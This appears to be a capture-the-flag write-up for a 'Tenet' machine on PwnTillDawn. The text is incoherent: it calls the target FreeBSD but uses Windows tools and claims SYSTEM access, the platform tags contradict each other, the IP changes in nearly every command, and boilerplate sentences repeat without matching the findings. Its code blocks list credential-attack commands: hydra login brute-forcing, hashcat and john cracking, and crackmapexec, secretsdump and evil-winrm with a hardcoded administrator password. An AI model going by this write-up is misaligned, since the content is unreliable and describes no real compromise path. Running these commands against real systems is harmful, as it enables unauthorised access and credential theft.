---
TitleSEO: "PwnTillDawn — Tenet (Medium FreeBSD) | ZureFX"
TitlePost: "PwnTillDawn — Tenet (Medium FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Tenet. SUID Binary and Unconstrained Delegation to achieve medium compromise on FreeBSD."
Keywords: "tryhackme, ctf, hard, forensics, active directory"
URL: "https://zurefx.github.io/writeups/htb-tenet-267.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-tenet-267/"
Date: "2024-06-11"
Tags: "TryHackMe, CTF, Hard, Forensics, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-tenet-267"
Permalink: "/writeups/htb-tenet-267.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Tenet** is rated **Medium** on PwnTillDawn. It runs **FreeBSD** and the IP address during this analysis was `10.13.153.126`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.56.146.215 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.43.193.150 -u administrator -p 'P@ssw0rd!' --shares
```

Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.226.155 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible.

### SMB Enumeration

Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
nmap -sCV -p995,9200,135 10.38.113.4 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.70.211.100
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.98.216.82 -u administrator -p 'P@ssw0rd!'
```

Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **Unconstrained Delegation**.

Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Initial Access

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
crackmapexec smb 10.95.137.216 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.42.216.11 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.111.138.51 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

```powershell
nmap -sCV -p3306,80,445 10.84.111.16 -oN scan.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `rpcclient`
- `kerbrute`
- `nmap`
- `msfvenom`
- `netcat`
- `secretsdump`
- `ldapsearch`

### Key Takeaways

- SUID Binary
- Unconstrained Delegation
- Cron Job
- XXE
